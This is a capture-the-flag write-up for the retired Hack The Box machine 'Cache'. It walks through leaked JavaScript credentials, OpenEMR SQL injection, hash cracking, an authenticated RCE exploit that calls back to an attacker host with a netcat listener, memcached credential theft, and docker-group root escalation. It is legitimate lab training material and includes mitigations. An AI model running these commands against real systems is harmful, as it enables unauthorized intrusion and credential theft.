---
machine: Cache
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, openemr, sqli, memcached, docker]
---

# Cache — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site leaks credentials in JavaScript and a hidden vhost hosts OpenEMR. An authentication bypass in the portal grants access to a page with SQLi, which yields an administrator bcrypt hash. Those credentials exploit authenticated OpenEMR RCE, the password is reused for `luffy`, and memcached reveals the next user. The `docker` group allows mounting the host and becoming root.

## Recon

```bash
nmap -Pn -sCV -p22,80,2201 <IP>
```

- `22/tcp` OpenSSH on Ubuntu 18.04, `80/tcp` Apache and `2201/tcp` a second SSH service.
- The `cache.htb` site contains JavaScript with embedded credentials.
- `wfuzz` for vhosts discovers `hms.htb`, serving OpenEMR.

## Enumeration

- OpenEMR's patient portal allows registration and then access to `add_edit_event_user.php` without full authentication.
- The `eid` parameter is injectable and `sqlmap` dumps the users table.
- `openemr_admin`'s hash is bcrypt and cracks with `hashcat -m 3200`.

## Foothold

With `openemr_admin`'s password, use the authenticated OpenEMR exploit (EDB) to write PHP and obtain a shell as `www-data`.

```bash
hashcat -m 3200 openemr_admin.hash rockyou.txt
python3 28408.rb http://hms.htb <USER> <PASSWORD> <ATTACKER> 443
nc -lnvp 443
```

## Lateral movement

The web password is reused for `luffy` over SSH. `luffy` can read memcached on `localhost:11211`; the `password` key contains another user's credentials, used with `su`.

## Privilege escalation

The second user belongs to the `docker` group. Mount the host `/` inside a container and write a key or read the flag directly.

```bash
id
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Evidence

- Credentials in JavaScript and the `hms.htb` vhost.
- Cracked bcrypt hash and a `www-data` shell.
- Memcached key and `docker run -v /:/mnt` as root.

## Lessons learned

- Credentials embedded in JavaScript are often reused for SSH.
- An authentication bypass turns SQLi into a full chain.
- Membership in the `docker` group is equivalent to host root.

## Mitigation and detection

- Never embed credentials in the frontend; rotate them.
- Update OpenEMR and restrict the portal.
- Remove users from the `docker` group and audit privileged mounts.

## References

- [0xdf — Cache](https://0xdf.gitlab.io/2020/10/10/htb-cache.html)
- [IppSec — Cache](https://www.youtube.com/watch?v=kfLU5-Eeyhw)
- [Hack The Box — Cache](https://app.hackthebox.com/machines/cache)
